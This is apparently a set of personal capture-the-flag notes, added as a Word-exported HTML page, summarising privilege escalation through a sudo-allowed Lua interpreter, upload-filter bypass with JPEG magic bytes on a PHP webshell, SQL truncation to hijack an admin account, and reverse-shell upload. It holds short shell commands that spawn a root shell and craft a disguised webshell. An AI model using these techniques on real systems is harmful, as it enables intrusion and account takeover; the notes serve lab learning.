@@ -1,1 +1,207 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:0cm;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+.MsoPapDefault
+	{margin-bottom:8.0pt;
+	line-height:107%;}
+@page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 72.0pt 72.0pt 72.0pt;}
+div.WordSection1
+	{page:WordSection1;}
+ /* List Definitions */
+ ol
+	{margin-bottom:0cm;}
+ul
+	{margin-bottom:0cm;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-GB style='word-wrap:break-word'>
+
+<div class=WordSection1>
+
+<p class=MsoListParagraph><b><span style='font-size:24.0pt;line-height:107%'>Scenarios
+– taken from CTF challenges</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+background:olive'>#### Deleted file by admin</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>.bash_history
+- reveals a file which has now been deleted (sudo -u sysadmin
+/home/syadmin/luvit privesc.ua)</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>sudo -l -
+reveals we can run root for certain software which execute lua code</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>echo
+&quot;require('os');&quot; &gt; priv.lua</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>echo
+&quot;os.execute('/bin/bash');&quot; &gt;&gt; priv.lua</span></p>
+
+<p class=MsoNormal><span style='font-size:18.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+background:lime'>#### uploading tool to server</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>sudo mv
+pspy64 /var/www/html</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>sudo service
+apache2 start</span></p>
+
+<p class=MsoNormal><span style='font-size:18.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+color:white;background:purple'>#### backgrounding a shell</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>you can
+create a shell code and use &amp; to background during SSH. Prevents other
+users been blocked</span></p>
+
+<p class=MsoNormal><span style='font-size:18.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+color:white;background:navy'>#### Magic bytes</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>you attempt
+to upload a file abc.php.jpg</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>- gets
+flagged up immediately</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>way around
+it: </span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>get the
+magic bytes from a .jpg image (xxd image.jpg | head)</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>add these to
+start of our abc.php.jpg</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>echo
+'FFD8FFDB' | xxd -r -p &gt; webshell.php.jpg</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>then upload</span></p>
+
+<p class=MsoNormal><span style='font-size:18.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+background:aqua'>### SQL Truncation</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>-<b> </b>a website
+states a username or email cannot be more than xyz size</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>-from burp
+sending a username more than what is permitted</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>- so we
+enter loads of spaces around admin and then url encode</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>- this works
+as according to MySQL documentation, trailing spaces are ingnored </span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>- so
+register account using admin@test.abc then catch request</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%'>- so now if
+we have an email of admin: admin@abc.abc add in many spaces after
+(admin@abc.abc++++++++++++++test)</span></p>
+
+<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+color:white;background:teal'>#### Email changing to admin for priv</span></b></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;color:black'>CTF
+where by the standard user could change password of the admin by catching in
+burpsuite and editing from user email to admin (which is found easily).</span></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'><span style='font-size:
+14.0pt;line-height:107%;color:black'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='font-size:14.0pt;line-height:107%;color:black'>Then
+when you go to profile of admin, source code view and you find</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;color:black'>and
+images upload directory.</span></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'><span style='font-size:
+14.0pt;line-height:107%;color:black'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='font-size:14.0pt;line-height:107%;color:black'>So
+you go bk to profile, upload a reverse php shell (no indicator if uploaded or
+not)</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;color:black'>then
+back to browser, type in /directory of image uploads followed by reverse shell</span></p>
+
+<p class=MsoNormal><span style='font-size:14.0pt;line-height:107%;color:black'>(ensure
+listener is on) – may need to use CURL</span></p>
+
+</div>
+
+</body>
+
+</html>
 
